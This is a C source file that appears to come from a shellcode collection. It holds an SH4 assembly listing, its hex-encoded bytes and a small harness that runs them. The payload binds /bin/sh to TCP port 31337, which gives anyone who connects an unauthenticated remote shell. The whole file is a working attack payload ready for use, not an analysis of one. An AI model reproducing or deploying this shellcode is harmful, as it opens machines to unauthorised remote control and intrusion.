/*
 * Bind /bin/sh on port 31337
 * SH4 - 132bytes
 * Dad`
main:
	mov     #102,r3
	mov     #2,r4
	mov     #1,r5
	xor     r6,r6
	mov.l   r6,@-r15
	mov.l   r5,@-r15
	mov.l   r4,@-r15
	mov     #1,r4
	mov     r15,r5
	trapa   #19
	mov     r0,r4
	mov     r0,r8
	xor     r2,r2
	mov.l   r2,@-r15
	mov     #105,r2
	mov.b   r2,@-r15
	mov     #122,r2
	mov.b   r2,@-r15
	xor     r2,r2
	mov.b   r2,@-r15
	mov     #2,r2
	mov.b   r2,@-r15
	mov     r15,r5
	mov     #16,r6
	mov.l   r6,@-r15
	mov.l   r5,@-r15
	mov.l   r4,@-r15
	mov     #2,r4
	mov     r15,r5
	trapa   #19
	mov     r8,r4
	xor     r5,r5
	xor     r6,r6
	mov.l   r6,@-r15
	mov.l   r5,@-r15
	mov.l   r4,@-r15
	mov     #4,r4
	mov     r15,r5
	trapa   #19
	mov     r8,r4
	xor     r5,r5
	xor     r6,r6
	mov.l   r6,@-r15
	mov.l   r5,@-r15
	mov.l   r4,@-r15
	mov     #5,r4
	mov     r15,r5
	trapa   #19
	mov     r0,r9
	mov     #3,r10
dup:
	add     #-1,r10
	mov     #63,r3
	mov     r9,r4
	mov     r10,r5
	trapa   #19
	cmp/pl  r10
	bt      dup
	mov     #11,r3
	mova    @(8,pc),r0
	mov     r0,r4
	xor     r5,r5
	trapa   #19
	.string "///bin/sh"
 */
#include <stdio.h>
#include <string.h>

char code[] = "\x66\xe3\x02\xe4\x01\xe5\x6a\x26\x66\x2f\x56\x2f\x46\x2f\x01\xe4\xf3\x65\x13\xc3\x03\x64\x03\x68\x2a\x22\x26\x2f\x69\xe2\x24\x2f\x7a\xe2\x24\x2f\x2a\x22\x24\x2f\x02\xe2\x24\x2f\xf3\x65\x10\xe6\x66\x2f\x56\x2f\x46\x2f\x02\xe4\xf3\x65\x13\xc3\x83\x64\x5a\x25\x6a\x26\x66\x2f\x56\x2f\x46\x2f\x04\xe4\xf3\x65\x13\xc3\x83\x64\x5a\x25\x6a\x26\x66\x2f\x56\x2f\x46\x2f\x05\xe4\xf3\x65\x13\xc3\x03\x69\x03\xea\xff\x7a\x3f\xe3\x93\x64\xa3\x65\x13\xc3\x15\x4a\xf8\x89\x0b\xe3\x01\xc7\x03\x64\x5a\x25\x13\xc3\x2f\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00";

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}